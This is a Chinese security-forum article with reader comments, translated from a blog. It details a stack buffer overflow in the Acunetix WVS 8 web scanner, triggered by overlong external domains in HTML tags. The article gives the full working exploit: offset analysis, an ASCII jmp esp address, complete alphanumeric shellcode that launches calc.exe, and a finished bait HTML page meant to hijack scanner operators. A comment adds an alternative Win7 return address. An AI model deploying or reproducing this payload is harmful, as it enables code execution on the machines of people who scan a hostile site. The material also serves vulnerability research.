<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">漏扫工具AWVS命令执行</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">livers</a> <span class="bull">·</span> <time title="2014/04/26 13:06" ui-time="" datetime="2014/04/26 13:06" class="published ng-binding ng-isolate-scope">2014/04/26 13:06</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>From: http://an7isec.blogspot.co.il/2014/04/pown-noobs-acunetix-0day.html</p><h2>0x00 概述</h2><hr><p>几个星期前，作者曾发表了关于WINRAR 0DAY（文件名欺骗）的文章。得到了大量人的关注和询问，所以这次又放出一个0day (最热门的漏扫工具 wvs)。作者POC测试版本为： ACUNETIX 8 (build 20120704) 貌似是老外用的非常多版本。作者意图想让攻击者在使用wvs 按下扫描键前三思而后行（这个才是真正的主动防护吧：）。</p><h2>0x01 漏洞分析</h2><hr><p>ACUNETIX 是一款强大的漏扫工具，很多新手喜欢用这个工具进行扫描。</p><p>在扫描初始化阶段，会有这样一个附加选项，如下图</p><p><img alt="enter image description here" img-src="d2cb6bc66f80d437f65e44307b77ecf6cb25667b.jpg"></p><p>这一点让作者产生了兴趣，通过分析得出wvs 在解析http response时，提取一些资源请求 类似:</p><pre><code>#!html
&lt;img src=http://externalSource.com/someimg.png &gt;
&lt;a href=http://externalSource.com/ &gt;&lt;/a&gt;
Etc...
</code></pre><p>作者又进一步分析了这个过程，惊奇的发现当某个外部域名长度超过268字节，wvs就会crash,作者开始尝试构造>=268字节长度的域名： 首先测试 如下</p><pre><code>&lt;A href= "http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&gt; 
</code></pre><p>用Immunity Debugger（OD是这工具的母板）附加挂载到wvs访问网站： Edx被0x41(A)覆盖 ，然后取数据段内存越权访问崩溃了：</p><p><img alt="enter image description here" img-src="e7f2e4530d04cb2eced5ac7b8b5af31748eef799.jpg"></p><p>作者本打算利用SHE溢出执行shellcode但是比较麻烦。</p><p>这里有个难点：</p><p>因为是url字串所以避免url的编码类似</p><pre><code>0x22 ("), 0x23 (#), 0x24 ($), 0x25 (%), 0x5C (), 0x2F (/)
</code></pre><p>所以，这里的shellcode不仅要是ascii，还要去除被URL编码的字符，也因为如此很难绕过SHE保护。</p><p>作者提出的思路，利用前面可控制的EDX构造一个可读的地址，同时要注意构造的edx地址要加8H</p><pre><code>#!bash
MOVE ECX, DWORD PTR DS: [EDX-8];
</code></pre><p>Edx必须满足下列两个条件：</p><pre><code>1.[edx]可读
2.是ASCII符合并且没有被URL转义的符号
</code></pre><p>最终利用了0x663030XX 对应ascii值 f005。</p><p>前面精确测试出URL在268字节时溢出（不包括http://），溢出点就是269这里（500f开始）。</p><pre><code>&lt;img src="http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"&gt;
</code></pre><p>用wvs扫描</p><p><img alt="enter image description here" img-src="5b4ef952394baef317585bc67b8d02cfc9f55704.jpg"></p><p>Ret之后，看到eip 被覆盖BBBB 0x42424242。</p><p>这里就选择shellcode 存放位置 ，eax是call函数时的参数，就只有268字节的A，esp当前栈顶指针指向着后面的B 明显选择esp（因为够大 ascii编码268字节的shellcode很紧张的） 能控制到eip,也找好了shellcode存放空间。</p><p>再者就是找jmp esp 以前都是用公开的通用地址，这里需要ascii字符且不被url编码的，作者用的系统sxs.dll 的0x7e79515d，ascii编码<code>]Qy~</code> 组合起来整个poc就是</p><pre><code>&lt;img src=”http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBB]Qy~BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB”&gt;
</code></pre><p>最后，用metasploit的Alphanumeric Shell模块生成了一个纯ascii且没有被url编码的弹calc.exe的shellcode ,你也可以试试用mst生成其他的shellcode玩玩，选取的地址[edx]和wvs（没有开启dep的编译选项），所以绕过dep防护。</p><pre><code>&lt;img src="http://AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBB]Qy~TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9JNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKPKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQKUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6LBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15XUXYUNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN KRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA"&gt;
</code></pre><h2>0x02 利用</h2><hr><p>作者这里搞的非常好玩，因为这个点必须要用wvs人选择下面这个才会有效。</p><p><img alt="enter image description here" img-src="1f7fe0e881ed6375f86393059a79c8555df5077e.jpg"></p><p>So,作者很猥琐构造了一些很诱惑的外部域名</p><pre><code>“SQLINJECTION” 
“XSS” 
“CSRF” 
And so on…





&lt;html&gt;
&lt;img src="http://SQLInjection..............................................................................................................................................................................................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA500fBBBB]Qy~TYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIHZXL9ID414ZTOKHI9LMUKVPZ6QO9X1P26QPZTW5S1JR7LCTKN8BGR3RWS9JNYLK79ZZ165U2KKLC5RZGNNUC70NEPB9OUTQMXPNMMPV261UKL71ME2NMP7FQY0NOHKPKZUDOZULDS8PQ02ZXM3TCZK47PQODJ8O52JNU0N72N28MZKLTNGU7ZUXDDXZSOMKL4SQKUNKMJPOOCRODCMDKR0PGQD0EYIRVMHUZJDOGTUV2WP3OIVQ1QJSLSKGBLYKOY7NWWLNG6LBOM5V6M0KF2NQDPMSL7XT80P61PBMTXYQDK5DMLYT231V649DZTPP26LWSQRLZLQK15XUXYUNP1BPF4X6PZIVOTZPJJRUOCC3KD9L034LDOXX5KKXNJQMOLSJ6BCORL9WXQNKPUWN KRKJ8JSNS4YMMOHT3ZQJOHQ4QJUQLN1VSLV5S1QYO0YA”&gt;
&lt;img src="http://XSS.............................................................................................................................................................................................."&gt;
&lt;img src="http://CSRF.............................................................................................................................................................................................."&gt;
&lt;img src="http://DeepScan.............................................................................................................................................................................................."&gt;
&lt;img src="http://NetworkScan.............................................................................................................................................................................................."&gt;
&lt;img src="http://DenialOfService.............................................................................................................................................................................................."&gt;
&lt;/html&gt;
</code></pre><p>如下图：</p><p><img alt="enter image description here" img-src="c4ac8900647cfdb6e45a3d975df096837ec35393.jpg"></p><h2>0x03 总结</h2><hr><p>我测试Wvs8.0 build 20120704 版本是可以成功弹出calc的。</p><p>后面评论有人说wvs8.0更新的版本也存在这个问题，我这里测试下列版本：</p><p>Wvs8.0 20130416版本 Wvs9 各个版本</p><p>都不存在此问题。</p><p><img alt="enter image description here" img-src="37411dda03d0651d4654f8a67aecd868107f9710.jpg"></p><p>作者给出的 <a href="http://static.wooyun.org/20141017/2014101715304818610.zip">exp下载</a>。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/9470" rel="bookmark" id="re1">WinRAR(5.21)-0day漏洞-始末分析</a></li><li><a href="http://drops.wooyun.org/papers/11692" rel="bookmark" id="re2">黑产godlike攻击: 邮箱 XSS 窃取 appleID 的案例分析</a></li><li><a href="http://drops.wooyun.org/papers/155" rel="bookmark" id="re3">CSRF简单介绍及利用方法</a></li><li><a href="http://drops.wooyun.org/papers/7031" rel="bookmark" id="re4">Hacking Team 新 Flash 0day分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">MeirLin</span> <span class="reply-time">2014-04-29 17:45:24</span></div><p></p><p>为何头像有如此高撸点 QAQ</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">园长</span> <span class="reply-time">2014-04-29 10:25:50</span></div><p></p><p>恭喜，你已成为VIP的肉鸡。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">GrayTrack</span> <span class="reply-time">2014-04-28 17:19:51</span></div><p></p><p>这个对付小白工具党最有爱了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Enjoy_Hacking</span> <span class="reply-time">2014-04-28 11:14:20</span></div><p></p><p>AWVS命令执行好像不用溢出这么麻烦吧</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Vito</span> <span class="reply-time">2014-04-28 10:13:58</span></div><p></p><p>这个不了解呀，慢慢学习。。。。早日搞到邀请码。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小胖子</span> <span class="reply-time">2014-04-28 08:46:37</span></div><p></p><p>还好，还好。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Comer</span> <span class="reply-time">2014-04-27 19:43:24</span></div><p></p><p>代表广大安全爱好者求份！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2014-04-27 17:21:25</span></div><p></p><p>幸亏扫描器是自己写的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">浅兮</span> <span class="reply-time">2014-04-26 19:50:12</span></div><p></p><p>外国货，不会用！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-04-26 17:37:03</span></div><p></p><p>谢啦。我用mona.py搜不全<br>过后试试</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">zzR</span> <span class="reply-time">2014-04-26 15:58:04</span></div><p></p><p>这让黑阔们情何以堪</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">livers</span> <span class="reply-time">2014-04-26 14:08:48</span></div><p></p><p>win7 下通用的ascii字符的ret地址比较少<br>0x6e6b2c74 MSVCP60.dll win7 英文旗舰版<br>ascii: "nk,t"<br>用这个玩玩</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-04-26 13:48:34</span></div><p></p><p>系统sxs.dll 的0x7e79515d,<br>这个win7下不能用，然后win7下又找不到可以用的jmp esp.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">猪猪猪</span> <span class="reply-time">2014-04-26 13:33:43</span></div><p></p><p>沙发，高端大气上档次，低调奢华有内涵！</p><p></p></div></div></div></div></div></main>